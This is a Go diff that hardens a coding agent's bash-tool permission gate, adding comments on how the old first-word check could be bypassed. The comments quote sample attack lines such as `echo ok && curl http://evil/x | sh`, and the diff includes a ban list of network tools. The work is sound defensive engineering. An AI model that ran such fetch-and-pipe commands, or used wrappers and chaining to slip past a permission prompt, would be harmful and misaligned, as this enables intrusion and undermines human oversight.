@@ -16,12 +16,12 @@ import (
 )
 
 type BashParams struct {
-	Command string `json:"command"`
+	Command string  `json:"command"`
 	Timeout FlexInt `json:"timeout"`
 }
 
 type BashPermissionsParams struct {
-	Command string `json:"command"`
+	Command string  `json:"command"`
 	Timeout FlexInt `json:"timeout"`
 }
 
@@ -47,14 +47,35 @@ var bannedCommands = []string{
 	"http-prompt", "chrome", "firefox", "safari",
 }
 
+// safeReadOnlyCommands may skip the permission prompt. Membership is a security
+// decision, not a convenience list — see commandgate.go for the gate itself.
+//
+// GORILLA OVERRIDE (2026-08-18): entries REMOVED from the upstream list, with
+// the reason each had to go. All were reachable with no prompt.
+//
+//	nohup, nice, time, timeout, env  WRAPPERS. The real command is their
+//	                                 ARGUMENT, so the gate never sees it:
+//	                                 `timeout 5 curl evil` read as "timeout".
+//	set, unset                       mutate the PERSISTENT shell session, so
+//	                                 they change what every later command does.
+//	kill, killall                    terminate arbitrary processes. Not read-
+//	                                 only by any definition.
+//	go run, go install               execute / install arbitrary code.
+//	go clean                         DELETES build output.
+//
+// KNOWN RESIDUAL RISK, stated rather than hidden: `go build` and `go test` are
+// kept because a coding agent runs them constantly and prompting every time
+// would make the tool unusable — but both execute code from the tree (cgo,
+// generators, the tests themselves). They are safe only to the degree the tree
+// is. Writing that code requires the write tool, which does prompt.
 var safeReadOnlyCommands = []string{
-	"ls", "echo", "pwd", "date", "cal", "uptime", "whoami", "id", "groups", "env", "printenv", "set", "unset", "which", "type", "whereis",
-	"whatis", "uname", "hostname", "df", "du", "free", "top", "ps", "kill", "killall", "nice", "nohup", "time", "timeout",
+	"ls", "echo", "pwd", "date", "cal", "uptime", "whoami", "id", "groups", "printenv", "which", "type", "whereis",
+	"whatis", "uname", "hostname", "df", "du", "free", "top", "ps",
 
 	"git status", "git log", "git diff", "git show", "git branch", "git tag", "git remote", "git ls-files", "git ls-remote",
 	"git rev-parse", "git config --get", "git config --list", "git describe", "git blame", "git grep", "git shortlog",
 
-	"go version", "go help", "go list", "go env", "go doc", "go vet", "go fmt", "go mod", "go test", "go build", "go run", "go install", "go clean",
+	"go version", "go help", "go list", "go env", "go doc", "go vet", "go fmt", "go mod", "go test", "go build",
 }
 
 func bashDescription() string {
@@ -143,24 +164,16 @@ func (b *bashTool) Run(ctx context.Context, call ToolCall) (ToolResponse, error)
 		return NewTextErrorResponse("missing command"), nil
 	}
 
-	baseCmd := strings.Fields(params.Command)[0]
-	for _, banned := range bannedCommands {
-		if strings.EqualFold(baseCmd, banned) {
-			return NewTextErrorResponse(fmt.Sprintf("command '%s' is not allowed", baseCmd)), nil
-		}
+	// GORILLA OVERRIDE (2026-08-18): check the WHOLE command line, not its first
+	// word. Upstream tested `strings.Fields(cmd)[0]` against the ban list and a
+	// prefix against the safe list, while shell.go hands the entire string to
+	// eval — so `echo ok && curl http://evil/x | sh` was neither banned nor
+	// prompted. See commandgate.go for the measurement and the rule.
+	if banned := BannedCommandIn(params.Command, bannedCommands); banned != "" {
+		return NewTextErrorResponse(fmt.Sprintf("command '%s' is not allowed", banned)), nil
 	}
 
-	isSafeReadOnly := false
-	cmdLower := strings.ToLower(params.Command)
-
-	for _, safe := range safeReadOnlyCommands {
-		if strings.HasPrefix(cmdLower, strings.ToLower(safe)) {
-			if len(cmdLower) == len(safe) || cmdLower[len(safe)] == ' ' || cmdLower[len(safe)] == '-' {
-				isSafeReadOnly = true
-				break
-			}
-		}
-	}
+	isSafeReadOnly := IsSafeReadOnly(params.Command, safeReadOnlyCommands)
 
 	sessionID, messageID := GetContextValues(ctx)
 	if sessionID == "" || messageID == "" {
